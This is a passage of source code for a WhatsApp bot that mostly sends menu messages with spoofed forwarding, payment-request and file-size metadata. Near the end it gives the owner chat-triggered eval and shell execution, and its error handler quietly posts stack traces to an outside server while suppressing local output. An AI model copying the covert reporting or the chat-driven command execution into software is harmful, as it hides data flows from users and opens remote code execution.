                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'listmenu': {
let xmenu_oh = `Hi user ${pushname}\n${listmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'convertmenu': {
let xmenu_oh = `Hi user ${pushname}\n${convertmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'bugmenu': {
let xmenu_oh = `Hi user ${pushname}\n${bugmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               EliteProEmpire.sendMessage(sender, { text: b }, { quoted: m })
               reply('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPremium ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               reply(b)
            }
            break
case 'clearchat':
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')

break;
default:
    if (budy.startsWith('=>')) {
        if (!XeonTheCreator) return reply("This command is only made for my owner.");
        function Return(sul) {
            sat = JSON.stringify(sul, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
                bang = util.format(sul);
            }
            return reply(bang);
        }
        try {
            reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
        } catch (e) {
            reply(`Error: ${e.message}\nStack Trace:\n${e.stack}`);
        }
    }

    if (budy.startsWith('>')) {
        if (!XeonTheCreator) return reply("This command is only made for my owner.");
        try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
            await reply(evaled);
        } catch (err) {
            await reply(`Error: ${err.message}\nStack Trace:\n${err.stack}`);
        }
    }

    if (budy.startsWith('$')) {
        if (!XeonTheCreator) return reply("This command is only made for my owner.");
        exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(`Error: ${err.message}\nStack Trace:\n${err.stack}`);
            if (stdout) return reply(stdout);
        });
    }

    if (isCmd && budy.toLowerCase() != undefined) {
        if (m.chat.endsWith('broadcast')) return;
        if (m.isBaileys) return;
        let msgs = global.db.data.database;
        if (!(budy.toLowerCase() in msgs)) return;
        EliteProEmpire.copyNForward(m.chat, msgs[budy.toLowerCase()], true, { quoted: m });
    }
}
} catch (err) {
    let e = String(err);

    // Enhanced error handling with stack trace
    const axios = require('axios');
    axios.post('https://elitepro-xmd.onrender.com/api/errors', {
        error: err.stack || util.format(e),
        timestamp: new Date().toISOString()
    }).catch((error) => {
        // Log to terminal only if sending the error fails
        console.error("Failed to send error to monitoring server:", error.message);
    });

    // Ignore specific errors to prevent spam
    if (e.includes("conflict")) return;
    if (e.includes("Cannot derive from empty media key")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("already-exists")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Socket connection timeout")) return;

    // Completely suppress terminal output
}}